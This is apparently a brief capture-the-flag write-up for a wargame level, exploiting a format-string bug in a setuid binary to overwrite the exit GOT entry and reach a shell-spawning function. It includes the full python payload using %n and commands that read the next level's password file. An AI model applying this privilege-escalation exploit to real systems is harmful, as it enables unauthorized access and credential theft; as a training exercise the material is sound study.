level5 binary with the rights of level6

main calls n

n:
fgets then calls printf
then calls exits

o:
syscall then exits

we can exploit printf like previously

the exit calls is not direct, it jumps to *0x8049838

let's change 0x8049838's value to the start of function o

we can modify the 4th registery with printf

chmod 777 .
touch exploit
chmod 777 exploit
python -c 'print("\x38\x98\x04\x08" + "%0134513824d" + "%4$n")' > exploit 
cat exploit - | ./level5

134513824 is o's address in decimal - 4

we can cat /home/user/level6/.pass
